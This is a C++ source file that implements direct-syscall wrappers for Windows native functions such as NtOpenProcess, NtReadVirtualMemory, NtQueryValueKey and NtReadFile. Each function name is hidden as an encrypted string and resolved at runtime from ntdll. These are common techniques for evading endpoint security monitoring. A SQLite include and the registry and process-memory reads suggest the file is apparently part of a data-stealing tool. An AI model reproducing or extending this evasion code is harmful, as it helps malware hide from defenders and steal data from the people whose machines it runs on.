#include "NT.h"
#include <winsqlite/winsqlite3.h>

namespace NT
{
	NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T* RegionSize, ULONG AllocationType, ULONG Protect)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtAllocateVirtualMemoryTemplate NtAVM = (NtAllocateVirtualMemoryTemplate)ExecuteSyscall;
		char NtAllocateVirtualMemoryStr[28] = "jPeHHKGEPArMVPQEHiAIKV]";

		if (NtAllocateVirtualMemoryAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtAllocateVirtualMemoryAddress = (NtAllocateVirtualMemoryTemplate)GetFuncAddress(ntdll, strdecrypt(NtAllocateVirtualMemoryStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtAllocateVirtualMemoryAddress);
		LoadSyscall(NtSyscall);
		status = NtAVM(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
		return status;
	}

	NTSTATUS NtOpenKey(HANDLE* KeyHandle, ACCESS_MASK DesiredAccess, WinDEF::OBJECT_ATTRIBUTES* ObjectAttributes)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtOpenKeyTemplate NtOK = (NtOpenKeyTemplate)ExecuteSyscall;
		char NtOpenKeyStr[11] = "jPkTAJoA]";

		if (NtOpenKeyAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt(ntdll_str));
			NtOpenKeyAddress = (NtOpenKeyTemplate)GetFuncAddress(ntdll, strdecrypt(NtOpenKeyStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtOpenKeyAddress);
		LoadSyscall(NtSyscall);
		status = NtOK(KeyHandle, DesiredAccess, ObjectAttributes);
		return status;
	}

	NTSTATUS NtQueryValueKey(HANDLE KeyHandle, WinDEF::UNICODE_STRING* ValueName, WinDEF::KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, ULONG* ResultLength)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtQueryValueKeyTemplate NtQVK = (NtQueryValueKeyTemplate)ExecuteSyscall;
		char NtQueryValueKeyStr[18] = "jPuQAV]rEHQAoA]";

		if (NtQueryValueKeyAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtQueryValueKeyAddress = (NtQueryValueKeyTemplate)GetFuncAddress(ntdll, strdecrypt(NtQueryValueKeyStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtQueryValueKeyAddress);
		LoadSyscall(NtSyscall);
		status = NtQVK(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
		return status;
	}

	NTSTATUS NtClose(HANDLE Handle)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtCloseTemplate NtC = (NtCloseTemplate)ExecuteSyscall;
		char NtCloseStr[10] = "jPgHKWA";

		if (NtCloseAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtCloseAddress = (NtCloseTemplate)GetFuncAddress(ntdll, strdecrypt(NtCloseStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtCloseAddress);
		LoadSyscall(NtSyscall);
		status = NtC(Handle);
		return status;
	}

	NTSTATUS NtCreateFile(HANDLE* FileHandle, ACCESS_MASK DesiredAccess, WinDEF::OBJECT_ATTRIBUTES* ObjectAttributes, WinDEF::IO_STATUS_BLOCK* IoStatusBlock, LARGE_INTEGER* AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtCreateFileTemplate NtCF = (NtCreateFileTemplate)ExecuteSyscall;
		char NtCreateFileStr[15] = "jPgVAEPAbMHA";

		if (NtCreateFileAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtCreateFileAddress = (NtCreateFileTemplate)GetFuncAddress(ntdll, strdecrypt(NtCreateFileStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtCreateFileAddress);
		LoadSyscall(NtSyscall);
		status = NtCF(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
		return status;
	}

	NTSTATUS NtReadFile(HANDLE FileHandle, HANDLE Event, WinDEF::PIO_APC_ROUTINE* ApcRoutine, PVOID ApcContext, WinDEF::IO_STATUS_BLOCK* IoStatusBlock, PVOID Buffer, ULONG Length, LARGE_INTEGER* ByteOffset, ULONG* Key)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtReadFileTemplate NtRF = (NtReadFileTemplate)ExecuteSyscall;
		char NtReadFileStr[15] = "jPvAE@bMHA";

		if (NtReadFileAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtReadFileAddress = (NtReadFileTemplate)GetFuncAddress(ntdll, strdecrypt(NtReadFileStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtReadFileAddress);
		LoadSyscall(NtSyscall);
		status = NtRF(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
		return status;
	}

	NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, SIZE_T* RegionSize, ULONG FreeType)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtFreeVirtualMemoryTemplate NtFVM = (NtFreeVirtualMemoryTemplate)ExecuteSyscall;
		char NtFreeVirtualMemoryStr[22] = "jPbVAArMVPQEHiAIKV]";

		if (NtFreeVirtualMemoryAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtFreeVirtualMemoryAddress = (NtFreeVirtualMemoryTemplate)GetFuncAddress(ntdll, strdecrypt(NtFreeVirtualMemoryStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtFreeVirtualMemoryAddress);
		LoadSyscall(NtSyscall);
		status = NtFVM(ProcessHandle, BaseAddress, RegionSize, FreeType);
		return status;
	}

	NTSTATUS NtOpenProcess(HANDLE* ProcessHandle, ACCESS_MASK DesiredAccess, WinDEF::OBJECT_ATTRIBUTES* ObjectAttributes, WinDEF::PCLIENT_ID ClientId)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtOpenProcessTemplate NtOP = (NtOpenProcessTemplate)ExecuteSyscall;
		char NtOpenProcessStr[22] = "jPkTAJtVKGAWW";

		if (NtOpenProcessAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtOpenProcessAddress = (NtOpenProcessTemplate)GetFuncAddress(ntdll, strdecrypt(NtOpenProcessStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtOpenProcessAddress);
		LoadSyscall(NtSyscall);
		status = NtOP(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
		return status;
	}

	NTSTATUS NtQuerySystemInformation(WinDEF::SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, ULONG* ReturnLength)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtQuerySystemInformationTemplate NtQSI = (NtQuerySystemInformationTemplate)ExecuteSyscall;
		char NtQuerySystemInformationStr[35] = "jPuQAV]w]WPAImJBKVIEPMKJ";

		if (NtQuerySystemInformationAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtQuerySystemInformationAddress = (NtQuerySystemInformationTemplate)GetFuncAddress(ntdll, strdecrypt(NtQuerySystemInformationStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtQuerySystemInformationAddress);
		LoadSyscall(NtSyscall);
		status = NtQSI(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
		return status;
	}

	NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, SIZE_T* NumberOfBytesRead)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtReadVirtualMemoryTemplate NtRVM = (NtReadVirtualMemoryTemplate)ExecuteSyscall;
		char NtQuerySystemInformationStr[35] = "jPvAE@rMVPQEHiAIKV]";

		if (NtReadVirtualMemoryAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtReadVirtualMemoryAddress = (NtReadVirtualMemoryTemplate)GetFuncAddress(ntdll, strdecrypt(NtQuerySystemInformationStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtReadVirtualMemoryAddress);
		LoadSyscall(NtSyscall);
		status = NtRVM(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesRead);
		return status;
	}

	NTSTATUS NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, WinDEF::MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, SIZE_T* ReturnLength)
	{
		NTSTATUS status = 0;
		DWORD NtSyscall = 0;
		NtQueryVirtualMemoryTemplate NtQVM = (NtQueryVirtualMemoryTemplate)ExecuteSyscall;
		char NtQuerySystemInformationStr[35] = "jPuQAV]rMVPQEHiAIKV]";

		if (NtQueryVirtualMemoryAddress == 0)
		{
			if (ntdll == 0)
				ntdll = GetModuleBaseAddress(strdecrypt("JP@HH\x0a@HH"));
			NtQueryVirtualMemoryAddress = (NtQueryVirtualMemoryTemplate)GetFuncAddress(ntdll, strdecrypt(NtQuerySystemInformationStr));
		}
		NtSyscall = GetSyscallNumber((uintptr_t)NtQueryVirtualMemoryAddress);
		LoadSyscall(NtSyscall);
		status = NtQVM(ProcessHandle, BaseAddress, MemoryInformationClass, MemoryInformation, MemoryInformationLength, ReturnLength);
		return status;
	}

	void RtlInitUnicodeString(WinDEF::UNICODE_STRING* unistr, const wchar_t* str)
	{
		unistr->Length = wstrlen_custom(str) * 2;
		unistr->MaximumLength = unistr->Length + 2;
		unistr->Buffer = (PWSTR)str;
	}
}